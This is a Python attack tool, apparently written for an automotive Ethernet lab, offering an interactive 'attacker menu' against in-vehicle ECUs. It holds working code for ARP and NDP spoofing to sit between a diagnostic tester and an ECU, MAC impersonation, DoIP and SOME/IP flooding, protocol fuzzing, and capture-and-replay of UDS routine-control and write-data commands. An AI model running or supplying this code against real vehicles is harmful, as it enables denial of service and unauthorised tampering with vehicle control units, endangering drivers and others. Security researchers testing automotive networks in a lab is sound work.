#!/usr/bin/env python3
import struct
import random
import socket
import os
import time
import threading
from scapy.all import ARP, IPv6, ICMPv6ND_NA, ICMPv6NDOptDstLLAddr, send, get_if_hwaddr, Raw, TCP, sniff, Ether, sendp

# Colors
R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
B = "\033[94m"
C = "\033[96m"
E = "\033[0m"

INTERFACE = "vethD"   # attacker interface
DOIP_PORT = 13400
# states
MAC_STATE = {
    "original": None,
    "discovered": {"ipv4": {}, "ipv6": {}}
}
DISCOVERED = MAC_STATE["discovered"]

# ===================== DoIP Helpers =====================
def doip_header(ptype, payload):
    return (
        b"\x02\xFD" +
        struct.pack("!H", ptype) +
        struct.pack("!I", len(payload)) +
        payload
    )

# ===================== MAC Helpers =====================
def set_mac(mac):
    os.system(f"ip link set dev {INTERFACE} down")
    os.system(f"ip link set dev {INTERFACE} address {mac}")
    os.system(f"ip link set dev {INTERFACE} up")
    print(f"[+] MAC changed to {mac}")

def restore_mac(original):
    if original:
        set_mac(original)
        print("[+] MAC restored")
# ==================== DISCOVERY ====================
def discovery_handler(pkt):
    if pkt.haslayer(ARP) and pkt.op == 2:
        ip, mac = pkt.psrc, pkt.hwsrc
        if ip not in DISCOVERED["ipv4"]:
            DISCOVERED["ipv4"][ip] = mac
            print(f"[ARP] {ip} → {mac}")
    if pkt.haslayer(IPv6) and pkt.haslayer(ICMPv6ND_NA):
        ip, mac = pkt[IPv6].src, pkt.src
        if ip not in DISCOVERED["ipv6"]:
            DISCOVERED["ipv6"][ip] = mac
            print(f"[NDP] {ip} → {mac}")


def start_discovery(timeout=10):
    print(f"[+] Sniffing for {timeout} seconds...")
    sniff(iface=INTERFACE, prn=discovery_handler, store=False, timeout=timeout)
    print("[+] Discovery finished")
# ===================== MAC Spoofing Attack =====================
def send_routing_activation(ecu_ip):
    try:
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((ecu_ip, DOIP_PORT))
        payload = struct.pack("!HBBI", 0x0E80, 0x10, 0x00, 0x00000000)
        s.send(doip_header(0x0005, payload))
        s.recv(4096)
        s.close()
        print("[+] Routing Activation sent")
    except Exception as e:
        print(f"[!] DoIP error: {e}")
# ===================== REPLAY STATE =====================
REPLAY = {
    "sniff": False,
    "frames": []   # list of dicts: {'uds': bytes, 'src': int, 'dst': int}
}
def parse_doip_uds(raw):
    if len(raw) < 12:
        return None
    ptype = int.from_bytes(raw[2:4], "big")
    plen  = int.from_bytes(raw[4:8], "big")
    if ptype != 0x8001:
        return None
    payload = raw[8:8+plen]
    if len(payload) < 4:
        return None
    src = int.from_bytes(payload[0:2], "big")
    dst = int.from_bytes(payload[2:4], "big")
    uds = payload[4:]
    return {"src": src, "dst": dst, "uds": uds}

def replay_packet_handler(pkt):
    if pkt.haslayer(TCP) and pkt.haslayer(IPv6):
        if pkt[TCP].sport == DOIP_PORT or pkt[TCP].dport == DOIP_PORT:

            tcp_payload = bytes(pkt[TCP].payload)
            if not tcp_payload:
                return

            parsed = parse_doip_uds(tcp_payload)
            if not parsed or not parsed["uds"]:
                return

            # Ignore TesterPresent
            if parsed["uds"][0] == 0x3E:
                return

            # Capture only 0x31 and 0x2E (حسب المطلوب)
            if parsed["uds"][0] not in (0x31, 0x2E):
                return

            REPLAY["frames"].append(parsed)
            print(f"[CAPTURED] UDS {parsed['uds'].hex()}")


def start_replay_sniff():
    if REPLAY["sniff"]:
        print("[!] Sniffer already running")
        return

    REPLAY["sniff"] = True
    print("[+] Replay sniffer STARTED")

    threading.Thread(
        target=lambda: sniff(
            iface=INTERFACE,
            prn=replay_packet_handler,
            store=False
        ),
        daemon=True
    ).start()


def stop_replay_sniff():
    REPLAY["sniff"] = False
    print("[+] Replay sniffer STOPPED")
def replay_show():
    if not REPLAY["frames"]:
        print("[!] No captured frames")
        return
    for i, f in enumerate(REPLAY["frames"]):
        print(f"{i}: UDS {f['uds'].hex()} (src=0x{f['src']:04X} dst=0x{f['dst']:04X})")

def replay_clear():
    REPLAY["frames"].clear()
    print("[+] Replay buffer cleared")
def replay_doip_frame(f, target_ipv6, port=DOIP_PORT):
    """
    Replay a captured DoIP UDS frame with proper Routing Activation.
    f: captured frame dict { 'src', 'dst', 'uds' }
    target_ipv6: ECU IPv6 address (e.g. fd00::10)
    """

    try:
        # 1) Open TCP connection to ECU (IPv6)
        s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((target_ipv6, port))

        # 2) Send Routing Activation
        ra_payload = struct.pack("!HBBI", f["src"], 0x10, 0x00, 0)
        s.send(doip_header(0x0005, ra_payload))
        s.recv(4096)  # wait for RA response

        # 3) Build DoIP Diagnostic message
        uds_payload = struct.pack("!HH", f["src"], f["dst"]) + f["uds"]
        doip_msg = doip_header(0x8001, uds_payload)

        # 4) Replay UDS
        s.send(doip_msg)

        print(f"[REPLAYED] UDS {f['uds'].hex()} → {target_ipv6}")

        s.close()

    except Exception as e:
        print(f"[!] Replay failed: {e}")



# ===================== LAYER 2 STATE =====================
L2_STATE = {
    "arp": False,
    "ndp": False
}
# ===================== ARP SPOOFING (IPv4) =====================
def arp_spoof_loop():
    attacker_mac = get_if_hwaddr(INTERFACE)

    # Node B (Button ECU) -> IPv4
    node_b_ip = "10.0.0.20"

    # Node C (Mirror ECU) -> IPv4
    node_c_ip = "10.0.0.10"

    print("[+] ARP spoofing loop started")

    pkt_to_b = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=node_c_ip,      # Pretend to be C
        pdst=node_b_ip,      # Tell B
        hwsrc=attacker_mac
    )

    pkt_to_c = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
        op=2,
        psrc=node_b_ip,      # Pretend to be B
        pdst=node_c_ip,      # Tell C
        hwsrc=attacker_mac
    )

    while L2_STATE["arp"]:
        sendp(pkt_to_b, iface=INTERFACE, verbose=False)
        sendp(pkt_to_c, iface=INTERFACE, verbose=False)
        time.sleep(2)

def start_arp_spoof():
    if L2_STATE["arp"]:
        print("[!] ARP spoofing already running")
        return

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    L2_STATE["arp"] = True

    t = threading.Thread(target=arp_spoof_loop, daemon=True)
    t.start()

    print("[+] ARP Spoofing (IPv4) STARTED")


def stop_arp_spoof():
    if not L2_STATE["arp"]:
        print("[!] ARP spoofing is not running")
        return

    L2_STATE["arp"] = False
    print("[+] ARP Spoofing STOPPED")
# ===================== NDP SPOOFING (IPv6) =====================
def ndp_spoof_loop():
    attacker_mac = get_if_hwaddr(INTERFACE)

    # IPv6 addresses
    tester_ipv6 = "fd00::20"   # Node A (Tester)
    ecu_ipv6    = "fd00::10"   # Node C (Mirror ECU)

    print("[+] NDP spoofing loop started")

    # Tell Tester: I am ECU
    na_to_tester = IPv6(dst=tester_ipv6) / ICMPv6ND_NA(
        R=0, S=1, O=1, tgt=ecu_ipv6
    ) / ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)

    # Tell ECU: I am Tester
    na_to_ecu = IPv6(dst=ecu_ipv6) / ICMPv6ND_NA(
        R=0, S=1, O=1, tgt=tester_ipv6
    ) / ICMPv6NDOptDstLLAddr(lladdr=attacker_mac)

    while L2_STATE["ndp"]:
        sendp(Ether()/na_to_tester, iface=INTERFACE, verbose=False)
        sendp(Ether()/na_to_ecu, iface=INTERFACE, verbose=False)
        time.sleep(2)


def start_ndp_spoof():
    if L2_STATE["ndp"]:
        print("[!] NDP spoofing already running")
        return

    L2_STATE["ndp"] = True
    threading.Thread(target=ndp_spoof_loop, daemon=True).start()
    print("[+] NDP Spoofing (IPv6) STARTED")


def stop_ndp_spoof():
    L2_STATE["ndp"] = False
    print("[+] NDP Spoofing STOPPED")
# ===================== DoIP TCP FLOOD (IPv6) =====================
def doip_tcp_flood():
    target_ipv6 = "fd00::10"   # Mirror ECU
    target_port = 13400

    count = int(input("Number of connections to open: ") or "100")
    print(f"[+] Starting DoIP TCP flood ({count} connections)")

    sockets = []

    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ipv6, target_port))
            sockets.append(s)

            if i % 10 == 0:
                print(f"Opened {i} connections")

        except Exception as e:
            print(f"[!] Error at {i}: {e}")
            break

    print("[+] Flood finished. Keeping sockets open (press Enter to release)")
    input()
    for s in sockets:
        s.close()
# ===================== DoIP ROUTING ACTIVATION FLOOD (IPv6) =====================
def doip_routing_flood():
    target_ipv6 = "fd00::10"   # Mirror ECU
    target_port = 13400

    count = int(input("Number of routing requests: ") or "200")
    print(f"[+] Starting DoIP Routing Activation flood ({count} requests)")

    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ipv6, target_port))

            # Fake Tester Logical Address (random)
            tester_logical = random.randint(0x0E00, 0x0EFF)
            ecu_logical    = 0x0E00

            # Routing Activation payload
            payload = struct.pack(
                "!HBBI",
                tester_logical,  # Source logical
                0x10,            # Activation type
                0x00,            # Reserved
                0x00000000
            )

            # DoIP header
            doip_pkt = struct.pack("!BBH", 0x02, 0xFD, 0x0005)
            doip_pkt += struct.pack("!I", len(payload))
            doip_pkt += payload

            s.send(doip_pkt)

            if i % 20 == 0:
                print(f"Sent {i}/{count} routing requests")

        except Exception as e:
            print(f"[!] Error at {i}: {e}")
            break

    print("[+] Routing Activation Flood finished")

# ===================== SOME/IP UDP FLOOD (IPv4) =====================
def someip_udp_flood():
    target_ip = "10.0.0.10"    # Mirror ECU (IPv4)
    target_port = 30490        # SOME/IP SD default

    count = int(input("Number of UDP packets to send: ") or "5000")
    size  = int(input("Payload size (bytes, default 200): ") or "200")

    payload = b"A" * size

    print(f"[+] Starting SOME/IP UDP flood: {count} packets to {target_ip}:{target_port}")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    for i in range(count):
        try:
            sock.sendto(payload, (target_ip, target_port))
            if i % 500 == 0:
                print(f"Sent {i}/{count}")
        except Exception as e:
            print(f"[!] Error at packet {i}: {e}")
            break

    print("[+] SOME/IP UDP Flood completed")

# ===================== SOME/IP Fuzzing =====================
def someip_fuzz(target_ip="10.0.0.10", target_port=30490, count=1000, max_size=300):
    """
    Fuzz SOME/IP service fields using malformed UDP packets.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    print(f"[+] Starting SOME/IP fuzzing: {count} packets to {target_ip}:{target_port}")

    for i in range(count):
        size = random.randint(10, max_size)  # random payload length
        payload = bytearray(random.getrandbits(8) for _ in range(size))

        try:
            sock.sendto(payload, (target_ip, target_port))
            if i % 100 == 0:
                print(f"Sent {i}/{count} SOME/IP fuzz packets")
        except Exception as e:
            print(f"[!] Error at packet {i}: {e}")

    print("[+] SOME/IP fuzzing completed")
    sock.close()
# ===================== DoIP/UDS Fuzzing =====================
def doip_fuzz(target_ipv6="fd00::10", port=13400, count=200, max_payload=200):
    """
    Fuzz DoIP and UDS messages over TCP.
    """
    print(f"[+] Starting DoIP/UDS fuzzing: {count} connections to {target_ipv6}:{port}")
    for i in range(count):
        try:
            s = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ipv6, port))

            # Randomize DoIP header
            header_type = random.choice([0x8001, 0x8002, 0x8003])
            payload_length = random.randint(1, max_payload)
            payload = bytearray(random.getrandbits(8) for _ in range(payload_length))

            # Randomize logical source/destination for UDS
            src = random.randint(0x0000, 0xFFFF)
            dst = random.randint(0x0000, 0xFFFF)
            uds_payload = src.to_bytes(2, "big") + dst.to_bytes(2, "big") + payload

            doip_pkt = b"\x02\xFD" + header_type.to_bytes(2, "big")
            doip_pkt += len(uds_payload).to_bytes(4, "big") + uds_payload

            s.send(doip_pkt)
            s.close()

            if i % 20 == 0:
                print(f"Sent {i}/{count} DoIP fuzz packets")
        except Exception as e:
            print(f"[!] Error at iteration {i}: {e}")

    print("[+] DoIP/UDS fuzzing completed")
# ===================== OPTIONAL: THREAD WRAPPERS =====================
def start_someip_fuzz_thread(**kwargs):
    t = threading.Thread(target=someip_fuzz, kwargs=kwargs, daemon=True)
    t.start()
    return t

def start_doip_fuzz_thread(**kwargs):
    t = threading.Thread(target=doip_fuzz, kwargs=kwargs, daemon=True)
    t.start()
    return t  
def mac_spoof_menu():
    # Save original MAC once
    if MAC_STATE["original"] is None:
        MAC_STATE["original"] = get_if_hwaddr(INTERFACE)
        print(f"[INFO] Original MAC saved: {MAC_STATE['original']}")

    while True:
        print("""
--- MAC Spoofing Attacks ---
1) Discover nodes (ARP/NDP)
2) Show discovered nodes
3) Impersonate node (change MAC)
4) Send DoIP Routing Activation
5) Restore original MAC
0) Back
""")

        choice = input("> ").strip()

        if choice == "1":
            print("[*] Starting ARP/NDP discovery...")
            start_discovery(timeout=10)

        elif choice == "2":
            print("\n--- Discovered IPv4 Nodes ---")
            if not DISCOVERED["ipv4"]:
                print("None")
            else:
                for ip, mac in DISCOVERED["ipv4"].items():
                    print(f"{ip} → {mac}")

        elif choice == "3":
            # Fallback if nothing discovered
            if not DISCOVERED["ipv4"]:
                mac = input("[!] No nodes discovered. Enter MAC manually: ")
                set_mac(mac)
                continue

            print("[*] Pick node to impersonate:")
            for i, (ip, mac) in enumerate(DISCOVERED["ipv4"].items()):
                print(f"{i}) {ip} → {mac}")

            try:
                idx = int(input("Index: "))
                ip = list(DISCOVERED["ipv4"].keys())[idx]
                set_mac(DISCOVERED["ipv4"][ip])
            except (ValueError, IndexError):
                print("[!] Invalid selection")

        elif choice == "4":
            ecu_ip = input("Enter ECU IPv6 (e.g. fd00::10): ").strip()
            send_routing_activation(ecu_ip)

        elif choice == "5":
            restore_mac(MAC_STATE["original"])

        elif choice == "0":
            restore_mac(MAC_STATE["original"])
            break

        else:
            print("[!] Unknown option")

# ===================== MAIN MENU =====================
def main_menu():
    while True:
        print("""
========= ATTACKER MENU =========
1) Layer 2 Attacks
2) DoS Attacks
3) Replay Attacks
4) Fuzzing Attacks
5) MAC Spoofing
0) Exit
===============================
""")
        c = input("> ").strip()

        if c == "1":
            layer2_menu()
        elif c == "2":
            dos_menu()
        elif c == "3":
            replay_menu()
        elif c == "4":
            fuzzing_menu()
        elif c == "5":
            mac_spoof_menu()
        elif c == "0":
        
            break

def dos_menu():
    while True:
        print("""
--- DoS Attacks ---
1) DoIP TCP Flood (IPv6)
2) SOME/IP UDP Flood (IPv4)
3) DoIP Routing Activation Flood
0) Back
""")
        c = input("> ").strip()

        if c == "1":
            doip_tcp_flood()
        elif c == "2":
            someip_udp_flood()
        elif c == "3":
            doip_routing_flood()
        elif c == "0":
            break



def layer2_menu():
    while True:
        print("""
--- Layer 2 Attacks ---
1) ARP Spoofing (IPv4)
2) NDP Spoofing (IPv6)
0) Back
""")
        c = input("> ").strip()

        if c == "1":
            sub = input("1) Start ARP\n2) Stop ARP\n> ").strip()
            if sub == "1":
                start_arp_spoof()
            elif sub == "2":
                stop_arp_spoof()

        elif c == "2":
            sub = input("1) Start NDP\n2) Stop NDP\n> ").strip()
            if sub == "1":
                start_ndp_spoof()
            elif sub == "2":
                stop_ndp_spoof()

        elif c == "0":
            break
def replay_menu():
    while True:
        print("""
--- Replay Attacks ---
1) Start Sniff
2) Stop Sniff
3) Show Captured
4) Replay
0) Back
""")
        c = input("> ").strip()

        if c == "1":
            start_replay_sniff()

        elif c == "2":
            stop_replay_sniff()

        elif c == "3":
            replay_show()

        elif c == "4":
            if not REPLAY["frames"]:
                print("[!] No captured frames")
                continue

            replay_show()
            idx = int(input("Frame index: "))
            target = input("Target ECU IPv6 [fd00::10]: ") or "fd00::10"
            replay_doip_frame(REPLAY["frames"][idx], target)

        elif c == "5":
            replay_clear()
        elif c == "0":
            break

def fuzzing_menu():
    while True:
        print("""
--- Fuzzing Attacks ---
1) SOME/IP Fuzzing
2) DoIP / UDS Fuzzing
3) Combined Fuzzing
0) Back
""")
        c = input("> ").strip()

        if c == "1":
            count = int(input("Number of packets (default 500): ") or "500")
            start_someip_fuzz_thread(count=count)

        elif c == "2":
            count = int(input("Number of connections (default 200): ") or "200")
            start_doip_fuzz_thread(count=count)

        elif c == "3":
            print("[+] Starting combined fuzzing")
            start_someip_fuzz_thread(count=500)
            start_doip_fuzz_thread(count=200)

        elif c == "0":
            break

# ===================== MAIN =====================
if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Run as root")
        exit(1)

    print(f"{C}=== CLEAN ATTACKER BASE ==={E}")
    main_menu()
